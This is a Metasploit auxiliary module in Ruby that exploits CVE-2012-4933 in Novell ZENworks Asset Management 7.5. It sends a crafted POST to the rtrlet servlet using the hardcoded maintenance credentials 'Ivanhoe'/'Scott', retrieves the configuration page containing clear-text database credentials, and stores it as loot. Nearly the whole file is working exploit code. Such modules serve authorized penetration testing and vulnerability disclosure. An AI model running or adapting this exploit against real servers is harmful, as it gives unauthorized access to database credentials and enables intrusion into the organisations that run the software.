##
2	
# This file is part of the Metasploit Framework and may be subject to
3	
# redistribution and commercial restrictions. Please see the Metasploit
4	
# web site for more information on licensing and terms of use.
5	
#   http://metasploit.com/
6	
##
7	
8	
require 'msf/core'
9	
10	
class Metasploit3 < Msf::Auxiliary
11	
12	
        include Msf::Exploit::Remote::HttpClient
13	
        include Msf::Auxiliary::Report
14	
        include Msf::Auxiliary::Scanner
15	
16	
        def initialize(info = {})
17	
                super(update_info(info,
18	
                        'Name'           => 'Novell ZENworks Asset Management 7.5 Configuration Access',
19	
                        'Description'    => %q{
20	
                                        This module exploits a hardcoded user and password for the GetConfig maintenance
21	
                                task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web
22	
                                Console and can be triggered by sending a specially crafted request to the rtrlet component,
23	
                                allowing a remote unauthenticated user to retrieve the configuration parameters of
24	
                                Nozvell Zenworks Asset Managmment, including the database credentials in clear text.
25	
                                This module has been successfully tested on Novell ZENworks Asset Management 7.5.
26	
                        },
27	
                        'License'        => MSF_LICENSE,
28	
                        'Author'         =>
29	
                                [
30	
                                        'juan vazquez' # Also the discoverer
31	
                                ],
32	
                        'References'     =>
33	
                                [
34	
                                        [ 'CVE', '2012-4933' ],
35	
                                        [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/10/11/cve-2012-4933-novell-zenworks' ]
36	
                                ]
37	
                ))
38	
39	
                register_options(
40	
                        [
41	
                                Opt::RPORT(8080),
42	
                        ], self.class)
43	
        end
44	
45	
        def run_host(ip)
46	
47	
                post_data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username=Ivanhoe&password=Scott&send=Submit"
48	
49	
                print_status("#{rhost}:#{rport} - Sending request...")
50	
                res = send_request_cgi({
51	
                        'uri'          => '/rtrlet/rtr',
52	
                        'method'       => 'POST',
53	
                        'data'         => post_data,
54	
                }, 5)
55	
56	
                if res and res.code == 200 and res.body =~ /<b>Rtrlet Servlet Configuration Parameters \(live\)<\/b><br\/>/
57	
                        print_good("#{rhost}:#{rport} - File retrieved successfully!")
58	
                        path = store_loot(
59	
                                'novell.zenworks_asset_management.config',
60	
                                'text/html',
61	
                                ip,
62	
                                res.body,
63	
                                nil,
64	
                                "Novell ZENworks Asset Management Configuration"
65	
                        )
66	
                        print_status("#{rhost}:#{rport} - File saved in: #{path}")
67	
                else
68	
                        print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
69	
                        return
70	
                end
71	
72	
        end
73	
74	
end
